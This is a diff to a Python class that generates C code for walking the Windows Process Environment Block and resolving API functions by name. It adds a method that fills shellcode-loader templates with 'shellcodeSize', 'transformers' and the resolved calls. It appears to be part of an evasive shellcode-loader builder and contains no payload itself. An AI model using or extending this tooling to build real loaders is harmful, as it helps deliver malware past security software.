@@ -13,6 +13,7 @@ class pebwalk:
                 print("Handle must be either LoadLibrary or GetModuleHandleA")
                 exit(0)
         self.typedefs = typedefs
+        self.apicalls = {}
 
     def imports(self) -> list[str]:
         return ['#include <windows.h>',
@@ -35,8 +36,8 @@ class pebwalk:
 PVOID LoadModulePeb( LPWSTR ModuleName )
 {
 
-    MY_PPEB PPEB_PTR = (MY_PPEB)__readgsqword( 0x60 );
-    PLIST_ENTRY Module      = ( ( MY_PPEB ) PPEB_PTR )->Ldr->InLoadOrderModuleList.Flink; 
+    PPEB PPEB_PTR = (PPEB)__readgsqword( 0x60 );
+    PLIST_ENTRY Module      = ( ( PPEB ) PPEB_PTR )->Ldr->InLoadOrderModuleList.Flink; 
     PLIST_ENTRY FirstModule = Module;
 
     WCHAR  SearchModuleLower[ MAX_PATH ]  = { 0 };
@@ -50,8 +51,8 @@ PVOID LoadModulePeb( LPWSTR ModuleName )
     {
         // Zero a buffer and lowercase the found module name
         RtlSecureZeroMemory( PebModuleLower, MAX_PATH );
-        PMY_LDR_DATA_TABLE_ENTRY mod = (PMY_LDR_DATA_TABLE_ENTRY)CONTAINING_RECORD(
-            Module, MY_LDR_DATA_TABLE_ENTRY, InLoadOrderLinks
+        PLDR_DATA_TABLE_ENTRY mod = (PLDR_DATA_TABLE_ENTRY)CONTAINING_RECORD(
+            Module, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks
         );
         memcpy( PebModuleLower, mod->BaseDllName.Buffer, mod->BaseDllName.Length );
         CharLowerBuffW( PebModuleLower, mod->BaseDllName.Length );
@@ -123,30 +124,6 @@ PVOID LoadFunction( PBYTE Module, LPSTR FunctionName )
 }
 """
 
-
-        if 'NtCreateThreadEx' in ntdll:
-            codeblock += """
-typedef struct _PS_ATTRIBUTE
-{
-    ULONG_PTR Attribute;
-    SIZE_T Size;
-    union
-    {
-        ULONG_PTR Value;
-        PVOID ValuePtr;
-    };
-    PSIZE_T ReturnLength;
-} PS_ATTRIBUTE, *PPS_ATTRIBUTE;
-        
-
-_Struct_size_bytes_(TotalLength)
-typedef struct _PS_ATTRIBUTE_LIST
-{
-    SIZE_T TotalLength;
-    PS_ATTRIBUTE Attributes[1];
-} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;
-"""
-
         codeblock += f"""
 
 {'\n'.join([value for key,value in self.typedefs.items() if key in self.apicalls ])}
@@ -178,9 +155,13 @@ void {self.name}(){{
 """
         return codeblock
 
-    def resolve(self, apicalls):
-        resolved = {}
-        self.apicalls = apicalls
-        for apicall in apicalls:
-            resolved[apicall] = f'resolver.{apicall}_resolved'
-        return resolved
+    def template(self, templateCode, transformers, shellcodeSize):
+        for _, field_name, _, _ in string.Formatter().parse(templateCode):
+            if field_name is not None and field_name not in ['shellcodeSize', 'transformers']:
+                self.apicalls[field_name] = ''
+        self.resolve()
+        return templateCode.format(transformers=transformers, shellcodeSize=shellcodeSize, **self.apicalls)
+
+    def resolve(self):
+        for apicall in self.apicalls:
+            self.apicalls[apicall] = f'resolver.{apicall}_resolved'
